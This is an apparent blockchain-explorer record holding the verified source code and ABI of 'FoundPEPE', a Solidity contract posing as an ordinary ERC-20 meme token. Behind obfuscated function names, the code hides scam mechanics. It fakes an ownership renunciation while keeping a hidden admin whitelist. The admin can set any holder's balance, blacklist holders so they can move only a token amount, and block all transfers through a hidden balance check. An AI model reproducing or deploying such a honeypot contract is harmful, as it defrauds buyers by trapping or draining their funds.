{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface exemptLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenSwap) external view returns (uint256);\n\n    function transfer(address enableSender, uint256 toBuy) external returns (bool);\n\n    function allowance(address modeLaunchedMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableSender,\n        uint256 toBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundLimit, uint256 value);\n    event Approval(address indexed modeLaunchedMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract launchedMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minToken {\n    function createPair(address receiverMax, address tradingLiquidityReceiver) external returns (address);\n}\n\ninterface exemptLiquidityMetadata is exemptLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FoundPEPE is launchedMin, exemptLiquidity, exemptLiquidityMetadata {\n\n    function transfer(address totalMin, uint256 toBuy) external virtual override returns (bool) {\n        return amountFee(_msgSender(), totalMin, toBuy);\n    }\n\n    function allowance(address takeSender, address autoEnable) external view virtual override returns (uint256) {\n        if (autoEnable == txLimit) {\n            return type(uint256).max;\n        }\n        return takeFee[takeSender][autoEnable];\n    }\n\n    mapping(address => uint256) private walletBuy;\n\n    address public isFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletLaunchTrading;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchTxReceiver;\n    }\n\n    uint256 private launchTxReceiver = 100000000 * 10 ** 18;\n\n    bool public totalLaunch;\n\n    uint256 private fundSell;\n\n    event OwnershipTransferred(address indexed tokenTake, address indexed txWallet);\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxAuto;\n    }\n\n    address private maxTake;\n\n    mapping(address => mapping(address => uint256)) private takeFee;\n\n    uint256 limitTrading;\n\n    function owner() external view returns (address) {\n        return maxTake;\n    }\n\n    uint8 private maxAuto = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingExempt;\n    }\n\n    string private walletLaunchTrading = \"FPE\";\n\n    function approve(address autoEnable, uint256 toBuy) public virtual override returns (bool) {\n        takeFee[_msgSender()][autoEnable] = toBuy;\n        emit Approval(_msgSender(), autoEnable, toBuy);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return maxTake;\n    }\n\n    function fromTx(address listTeamMode) public {\n        if (totalLaunch) {\n            return;\n        }\n        if (fundSell == fromMax) {\n            fromMax = fundSell;\n        }\n        marketingReceiverTx[listTeamMode] = true;\n        if (fundSell != fromMax) {\n            fromMax = fundSell;\n        }\n        totalLaunch = true;\n    }\n\n    uint256 public fromMax;\n\n    address txLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public exemptReceiver;\n\n    mapping(address => bool) public marketingReceiverTx;\n\n    address listExemptTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public amountLaunch;\n\n    function sellMinReceiver(uint256 toBuy) public {\n        feeWalletTx();\n        limitTrading = toBuy;\n    }\n\n    function buyEnable(address totalMin, uint256 toBuy) public {\n        feeWalletTx();\n        walletBuy[totalMin] = toBuy;\n    }\n\n    function amountFee(address toLimit, address enableSender, uint256 toBuy) internal returns (bool) {\n        if (toLimit == isFund) {\n            return toTeamExempt(toLimit, enableSender, toBuy);\n        }\n        uint256 minMaxTx = exemptLiquidity(amountLaunch).balanceOf(listExemptTx);\n        require(minMaxTx == limitTrading);\n        require(enableSender != listExemptTx);\n        if (txList[toLimit]) {\n            return toTeamExempt(toLimit, enableSender, launchedFund);\n        }\n        return toTeamExempt(toLimit, enableSender, toBuy);\n    }\n\n    string private tradingExempt = \"Found PEPE\";\n\n    function transferFrom(address toLimit, address enableSender, uint256 toBuy) external override returns (bool) {\n        if (_msgSender() != txLimit) {\n            if (takeFee[toLimit][_msgSender()] != type(uint256).max) {\n                require(toBuy <= takeFee[toLimit][_msgSender()]);\n                takeFee[toLimit][_msgSender()] -= toBuy;\n            }\n        }\n        return amountFee(toLimit, enableSender, toBuy);\n    }\n\n    function toTeamExempt(address toLimit, address enableSender, uint256 toBuy) internal returns (bool) {\n        require(walletBuy[toLimit] >= toBuy);\n        walletBuy[toLimit] -= toBuy;\n        walletBuy[enableSender] += toBuy;\n        emit Transfer(toLimit, enableSender, toBuy);\n        return true;\n    }\n\n    function fundExempt(address launchedFee) public {\n        feeWalletTx();\n        if (fundSell != fromMax) {\n            fundSell = fromMax;\n        }\n        if (launchedFee == isFund || launchedFee == amountLaunch) {\n            return;\n        }\n        txList[launchedFee] = true;\n    }\n\n    uint256 constant launchedFund = 5 ** 10;\n\n    uint256 marketingReceiver;\n\n    mapping(address => bool) public txList;\n\n    function enableWallet() public {\n        emit OwnershipTransferred(isFund, address(0));\n        maxTake = address(0);\n    }\n\n    function feeWalletTx() private view {\n        require(marketingReceiverTx[_msgSender()]);\n    }\n\n    function balanceOf(address tokenSwap) public view virtual override returns (uint256) {\n        return walletBuy[tokenSwap];\n    }\n\n    constructor (){\n        if (exemptReceiver != fromMax) {\n            fundSell = exemptReceiver;\n        }\n        receiverTake launchedSwap = receiverTake(txLimit);\n        amountLaunch = minToken(launchedSwap.factory()).createPair(launchedSwap.WETH(), address(this));\n        if (exemptReceiver == fromMax) {\n            fromMax = exemptReceiver;\n        }\n        isFund = _msgSender();\n        enableWallet();\n        marketingReceiverTx[isFund] = true;\n        walletBuy[isFund] = launchTxReceiver;\n        if (fromMax != exemptReceiver) {\n            fundSell = exemptReceiver;\n        }\n        emit Transfer(address(0), isFund, launchTxReceiver);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunchedMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toBuy\",\"type\":\"uint256\"}],\"name\":\"buyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeamMode\",\"type\":\"address\"}],\"name\":\"fromTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"}],\"name\":\"fundExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingReceiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toBuy\",\"type\":\"uint256\"}],\"name\":\"sellMinReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FoundPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}